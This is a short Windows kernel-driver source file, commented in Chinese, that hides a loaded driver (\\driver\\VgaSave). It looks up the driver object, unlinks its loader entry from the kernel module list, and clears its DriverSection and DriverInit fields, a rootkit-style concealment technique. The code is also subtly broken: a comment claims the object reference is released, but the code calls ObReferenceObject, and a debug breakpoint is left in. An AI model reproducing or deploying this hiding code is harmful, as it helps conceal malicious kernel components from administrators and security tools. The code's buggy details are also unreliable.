#include <ntifs.h>

extern POBJECT_TYPE* IoDriverObjectType;

typedef struct _KLDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    ULONG __Undefined1;
    ULONG __Undefined2;
    ULONG __Undefined3;
    ULONG NonPagedDebugInfo;
    ULONG DllBase;
    ULONG EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT __Undefined5;
    ULONG __Undefined6;
    ULONG CheckSum;
    ULONG TimeDateStamp;
} KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;

NTKERNELAPI NTSTATUS ObReferenceObjectByName(
    __in PUNICODE_STRING ObjectName,
    __in ULONG Attributes,
    __in_opt PACCESS_STATE AccessState,
    __in_opt ACCESS_MASK DesiredAccess,
    __in POBJECT_TYPE ObjectType,
    __in KPROCESSOR_MODE AccessMode,
    __inout_opt PVOID ParseContext,
    __out PVOID* Object
);

VOID DriverUnload(PDRIVER_OBJECT pDriver) {
}

// 此时不需要通过链表遍历去比较驱动名称
// 而是直接通过ObReferenceObjectByName拿到驱动对象
// 通过驱动中的驱动节区断链
VOID HideDriver(PWCH objName) {
    LARGE_INTEGER time = { 0 };
    time.QuadPart = -10000 * 20000;
    KeDelayExecutionThread(KernelMode, FALSE, &time);

    UNICODE_STRING driverName = { 0 };
    RtlInitUnicodeString(&driverName, objName);

    PDRIVER_OBJECT driver = NULL;
    NTSTATUS status = ObReferenceObjectByName(
        &driverName,
        FILE_ALL_ACCESS,
        0,
        0,
        *IoDriverObjectType,
        KernelMode,
        NULL,
        &driver
    );

    DbgBreakPoint();
    if (NT_SUCCESS(status)) {
        PKLDR_DATA_TABLE_ENTRY p = (PKLDR_DATA_TABLE_ENTRY)driver->DriverSection;
        DbgPrintEx(77, 0, "[db] SysName: %wZ\n", &p->BaseDllName);
        RemoveEntryList(&p->InLoadOrderLinks);
        driver->DriverInit = NULL;
        driver->DriverSection = NULL;
        ObReferenceObject(driver); // 释放对象指针，否则会泄露
    }

    return;
}


VOID RunHideDriver(PWCH driverService) {
    HANDLE hProcess = NULL;
    NTSTATUS status = PsCreateSystemThread(
        &hProcess,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        HideDriver,
        driverService
    );

    if (NT_SUCCESS(status)) {
        NtClose(hProcess);
    }
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) {
    PWCH driverService = L"\\driver\\VgaSave";
    RunHideDriver(driverService);
	pDriver->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}